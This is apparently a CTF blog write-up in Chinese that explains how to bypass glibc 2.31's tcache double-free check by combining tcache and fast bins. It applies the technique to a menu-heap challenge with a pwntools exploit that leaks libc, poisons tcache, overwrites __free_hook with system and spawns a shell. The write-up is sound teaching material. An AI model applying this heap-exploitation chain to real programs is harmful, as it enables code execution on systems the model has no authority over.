---
title: tcache中的double free
date: 2021-09-03 22:20:23
tags: ['ctf','信息安全']
categories: ['ctf']
---

# 前言

  第一次参加组内月赛，借这个机会正好熟悉一下**glibc2.31**下的tcache攻击的相关套路


# 难点

  相比较前面，**tcache**增加了如下代码，检查可能的**double free**
```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
```

  可以看到，这里会判断**tcache**的**key**字段的值。而每一个被释放的**tcache**，其**key**都会按照如下代码，被设置为固定的值，从而尽可能避免了**double free**
  ```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

  因此，这里没有办法轻易的使用**double free**——**free**的chunk大小只要在**tcache**的范围之内，都会首先以**tcache**的方式进行释放，也就是会检查这个字段(**tc_idx < mp_.tcache_bins**的条件一般总是满足的)，总而导致无法方便的**double free**


# 策略

  目前绕过的策略是利用**fast bin**和**tcache**，共同完成**double free**攻击
  如果我们想要完成**victim**内存块的**double free**攻击，其基本策略如下所示：
1. 首先任意释放7个与**victim**相同大小的chunk，从而将对应的**tcache**填充满，如下图所示
  ![tcache填充满](tcache填充满.PNG)
2. 将**victim**内存块释放掉。由于**tcache**已经满了，则其会被释放到对应大小的**fast bin**链上，如下图所示
  ![释放victim](释放victim.PNG)
3. 申请一个与**victim**相同大小的chunk。根据**malloc**的分配流程，其会首先从**tcache**中进行申请，然后再去查找**fast bin**。因此这里会分配前面的**chunk7**，如下图所示
  ![重新申请内存](重新申请内存.PNG)
4. 重新释放**victim**内存块。由于之前**tcache**中没有释放过**victim**，则可以正常释放；但是**fast bin**中已经有**victim**内存块，则完成了**double free**，如下图所示
  ![再次释放victim](再次释放victim.PNG)

  之后一般的利用方式就是普通的**double free**
  可以通过申请**victim**内存并修改其上的数据，从而修改掉**fast bin**的链表指向。

# 实例 pwn2

  点击[附件链接](pwn2.tar.gz)下载文件

## 保护分析

  首先我们简单的查看一下程序相关的保护机制
  ![保护机制](保护机制.PNG)

  可以看到，基本上所有保护都全部开启，那么基本上可以猜测，这是一道菜单堆的题目

## 漏洞分析

  我们首先介绍一下程序的逻辑结构。
  整个程序主要分为三个逻辑块，创建note、删除note和输出note信息。

  其创建note的程序逻辑如下所示
  ```c
int add()
{
  int i; // [rsp+8h] [rbp-8h]
  unsigned int size; // [rsp+Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
      return puts("Full!");
    if ( !*((_QWORD *)&unk_4068 + 8 * (__int64)i) || *((_DWORD *)&notes + 16 * (__int64)i) )
      break;
  }
  printf("Size: ");
  size = read_int();
  if ( size > 0x78 )
    return puts("Too big!");
  *((_QWORD *)&unk_4068 + 8 * (__int64)i) = malloc(size);
  memset(*((void **)&unk_4068 + 8 * (__int64)i), 0, size);
  printf("Note: ");
  read_input(*((_QWORD *)&unk_4068 + 8 * (__int64)i), size);
  printf("Description of this note: ");
  __isoc99_scanf("%48s", (char *)&notes + 64 * (__int64)i + 16);
  *((_DWORD *)&notes + 16 * (__int64)i) = 0;
  return puts("Done!");
}
```

  实际上，这里有一个很明显的溢出漏洞(实际上我一开始不太确认，还在电脑上简单测试了一下)——`__isoc99_scanf("%48s", (char *)&notes + 64 * (__int64)i + 16);`这一行代码，其限制了48个字符，但是字符串结尾的`\x00`没有计算在内，这实际上会覆盖掉`((_DWORD *)&notes + 16 * (__int64)i)`

  对于删除note的程序逻辑，其如下所示
  ```c
int delete()
{
  void *v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Which note do you want to delete?\nIndex: ");
  v2 = (int)read_int();
  if ( v2 <= 9 )
  {
    if ( *((_QWORD *)&unk_4068 + 8 * v2) )
    {
      if ( *((_DWORD *)&notes + 16 * v2) )
      {
        puts("Double free! Bad hacker :(");
        _exit(-1);
      }
      free(*((void **)&unk_4068 + 8 * v2));
      v0 = &notes;
      *((_DWORD *)&notes + 16 * v2) = 1;
    }
    else
    {
      LODWORD(v0) = puts("No such note!");
    }
  }
  else
  {
    LODWORD(v0) = puts("Invalid index.");
  }
  return (int)v0;
}
```

  并没有什么明显的漏洞。但是配合分配时的溢出漏洞，可以实现一个内存块的多次释放——即存在了**double free**的可能性

  最后对于输出note信息，其逻辑如下所示
```c
int list()
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 9; ++i )
  {
    if ( *((_QWORD *)&unk_4068 + 8 * (__int64)i) && !*((_DWORD *)&notes + 16 * (__int64)i) )
      printf(
        "Note %d:\n  Data: %s\n  Desc: %s\n",
        (unsigned int)i,
        *((const char **)&unk_4068 + 8 * (__int64)i),
        (const char *)&notes + 64 * (__int64)i + 16);
  }
  return puts(byte_2078);
}
```

  类似于删除note，没有什么明显的漏洞，但是配合分配note时的溢出，可以打印被释放的内存上的相关信息——这是泄露**libc**基址的基础。

## 漏洞利用

  实际上，根据前面的漏洞分析，其大致的思路也很简单
  通过分配时的note溢出，从而构造**double free**，进而控制**fast bin**链的指向，替换为可控内存地址，分配该内存地址后，将其释放到**unsorted bin**中。再次利用分配时的note溢出，打印出**unsorted bin**中内存上的相关信息，从而泄露**libc**基址
  其次，由于我们有可控内存地址，则我们修改该值，从而覆盖掉释放的chunk，从而更改**tcache**链的指向，从而分配`__free_hook`附近的内存地址，并将其覆写成`system`的值，通过释放一个包含`/bin/bash`字段的内存对象，最终获取程序的**shell**

  实际上，这里面还有较多的细节需要注意——其申请内存最多不超过**0x78**，即chunk大小为**0x80**，但是我们如何将其释放到**unsorted bin**中，这通常需要一些技巧，即在可控的连续内存对象上伪造一个内存对象，然后将其插入**tcache**或**bin**中。
  ![伪造chunk](伪造chunk.PNG)

  这里简单介绍一下，为了避免申请/释放内存对我们伪造的内存块产生影响，则我们将伪造的chunk从正常chunk的**SIZE_SZ * 2**偏移处开始构造；一般使用都是通过**double free**插入空闲链表，然后申请后在进行释放，因此需要构造相应的环境通过检查(一个0x20的正在使用的pre chunk、两个0x20的正在使用的next chunk)，从而可以绕过各种检查，将该伪造的chunk当作正常的chunk使用。

  这样子，由于我们将chunk伪造在可控内存地址处，则伪造的chunk上的数据可以通过更改可控内存地址进行修改，从而修改空闲链的指向
  另一方面，由于往往伪造的chunk很大，会跨越多个正常的chunk，因此我们可以通过修改伪造chunk的数据，从而更改正常chunk上的值，也同样可以修改空闲链的指向


## 实现

  最后，这里给出这个漏洞利用的具体实现和细节说明

  首先，我们的目标是伪造一个足够大的chunk(不在tcache的范围内，本题选择0x470)，从而释放可以直接释放到**unsorted bin**中。
  1. 伪造一个大小是0x80的fake chunk，并将其通过**double free**插入到**fast bin**的空闲链上，绕过大小检查。并且将其申请出来。
  2. 通过修改fake chunk所在的chunk的数据，将fake chunk的大小更改为0x470，此时fake chunk仍在可控内存对象中，并且其为了绕过周边检查的环境已经铺垫好
  3. 将fake chunk释放掉，则会将其释放到**unsorted bin**的链上

  由于我们会利用到**double free**，则我们首先按照前面的漏洞分析，构造一个**double free**的环境，如下代码所示
  ```python
        #leak the chunk address
        node_add(r, 0x78, 'a', 'a\n')     #0 chunk_base
        node_add(r, 0x78, 'a', 'a\n')     #1 chunk_base + 0x80
        node_add(r, 0x78, 'a', 'a\n')     #2 chunk_base + 0x80 * 2
        node_add(r, 0x78, 'a', 'a\n')     #3 chunk_base + 0x80 * 3
        node_add(r, 0x78, 'a', 'a\n')     #4 chunk_base + 0x80 * 4
        node_add(r, 0x78, 'a', 'a\n')     #5 chunk_base + 0x80 * 5
        node_add(r, 0x78, 'a', 'a\n')     #6 chunk_base + 0x80 * 6
        node_add(r, 0x78, 'a', 'a\n')     #7 chunk_base + 0x80 * 7
        node_add(r, 0x78, 'a', 'a\n')     #8 chunk_base + 0x80 * 8
        node_add(r, 0x78, p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21), 'a\n')     #9 chunk_base + 0x80 * 9



        node_del(r, 8)
        node_del(r, 7)
        node_del(r, 6)
        node_del(r, 5)
        node_del(r, 4)
        node_del(r, 3)
        node_del(r, 0)                      #tcache full

        node_del(r, 9)
        node_del(r, 2)
        node_del(r, 1)
```

  此时内存中的布局如下所示
  ![内存布局1](内存布局1.PNG)

  如果我们要将伪造的chunk插入到空闲链上，首先需要知道chunk的地址。这个其实不是很困难——我们通过前面的溢出，会将`idx = 1`的chunk重新标明为未释放，则打印时会打印其内容，根据内存布局可知，会打印**base + 0x80 * 2**的值，从而我们可以获取**base**的值，即获取了整个内存布局的地址。
  与此同时，我们在利用溢出的过程中，同时在`idx = 0`的chunk上构造对应的伪造chunk，为之后将该伪造chunk插入链表中做铺垫，代码如下所示
```python
        node_add(r, 0x78, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x81), 'a' * 0x30)      #0 chunk_base
        info = node_list(r).split('Note 1:\n  Data: ')[1].split('\n  Desc: ')[0]
        chunk_base = u64(info.ljust(8, '\x00')) - 0x80 * 2
        log.info('chunk_base => %x'%(chunk_base))
```

  此时，其内存布局如下所示
  ![内存布局2](内存布局2.PNG)

  可以看到，此时在**base + 0x30**上，已经有了一个fake chunk(其之后会更改大小，因此不需要在伪造前后chunk)，则下面我们只需要进行**double free**，并修改**fast bin**的指向即可——即释放`idx = 1`的chunk，如下所示
  ```python
        node_del(r, 1)                      #double free
```

  其内存布局已经构成**double free**的局面，如下所示
  ![内存布局3](内存布局3.PNG)

  此时，我们将fake chunk挂在**fast bin**的链上即可，代码如下
  ```python
      node_add(r, 0x78, p64(chunk_base + 0x30), 'a\n')             #1 chunk_base + 0x80
```

  其fake chunk已经被插入到**fast bin**链上，如下所示
  ![内存布局4](内存布局4.PNG)

  然后，需要将该fake chunk分配出来，并通过修改**base**对应的chunk数据，从而覆写fake chunk的大小，最后将其释放到**unsorted bin**中即可，相关代码如下所示
  ```python
       node_add(r, 0x78, 'a', 'a\n')           #2 chunk_base + 0x80 * 3 
        node_add(r, 0x78, 'a', 'a\n')           #3 chunk_base + 0x80 * 4
        node_add(r, 0x78, 'a', 'a\n')           #4 chunk_base + 0x80 * 5
        node_add(r, 0x78, 'a', 'a\n')           #5 chunk_base + 0x80 * 6
        node_add(r, 0x78, 'a', 'a\n')           #6 chunk_base + 0x80 * 7
        node_add(r, 0x78, 'a', 'a\n')           #7 chunk_base + 0x80 * 8        tcache empty


        node_add(r, 0x78, 'a', 'a\n')           #8 chunk_base + 0x80
        node_add(r, 0x78, p64(0) * ((0x80 - 0x30 - 0x10) / 0x8) + p64(0) + p64(0x81), 'a\n')           #9 chunk_base + 0x30
```

  此时，`idx = 0`到`idx = 9`上都被分配了相关的chunk，此时一方面需要更改**base**对应的chunk数据，并重新覆写fake chunk大小；另一方面，需要将fake chunk释放到**unsorted bin**中，并且通过该值获取**libc**基址，代码如下所示
  ```python
        node_del(r, 8)                          #to show unsorted_bin in index9
        node_del(r, 0)

        node_add(r, 0x78, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x471), 'a\n')    #0 chunk_base                  change the chunk size in index8
        node_del(r, 9)
        node_add(r, 0x78, 'a', 'a' * 0x30)                                               #8 chunk_base + 0x80       change the flag in index8
        info = node_list(r).split('Note 9:\n  Data: ')[1].split('\n  Desc: ')[0]
        lib_base = u64(info.ljust(8, '\x00')) + 0x7fdb734b0000 - 0x7fdb734a7be0
        log.info('lib_base => %x'%lib_base)
```

  此时其内存布局如下所示
  ![内存布局5](内存布局5.PNG)

  目前，我们已经获取了**libc**的基址了，并且我们可以通过修改fake chunk的值，从而覆盖其他正常**tcache**的值，从而修改**tcache**的链的指向，则我们只需要将**__free_hook**插入到**tcache**链上即可，代码如下所示
  ```python
        node_del(r, 0)
        node_add(r, 0x78, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x81), 'a\n')                              #0 chunk_base
        node_del(r, 1)
        node_add(r, 0x78, p64(0) * 4 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21), 'a\n')                 #1 chunk_base + 0x80




        node_del(r, 3)
        node_del(r, 2)
        node_del(r, 1)
        node_del(r, 9)
        free_hook = lib_base + lib_file.sym['__free_hook'] - 0x7f0d689bbb28 + 0x7f0d687f6b28
        log.info('__free_hook => %x'%(free_hook))
        node_add(r, 0x78, p64(0) * ((0x70 - 0x30) / 0x8) + p64(0) + p64(0x81) + p64(free_hook), 'a\n')                          #1 chunk_base + 0x30
        node_add(r, 0x78, '/bin/bash\x00', 'a\n')                       #2 chunk_base + 0x80

        system = lib_base + lib_file.sym['system'] - 0x7f0d688449f0 + 0x7f0d6867f9f0
        log.info('system => %x'%(system))
        node_add(r, 0x78, p64(system), 'a\n')


        node_del(r, 2)
        r.interactive()
```

  这里需要特别说明一下，由于fake chunk的大小是0x470，我们无法分配到。因此，我们首先需要通过覆写`idx = 0`的chunk，重新设置fake chunk的大小。
  另一方面，由于之后会释放该fake chunk，因此需要覆写`idx = 1`的chunk，为其绕过检查构造出一个0x20的正在使用的pre chunk、两个0x20的正在使用的next chunk。
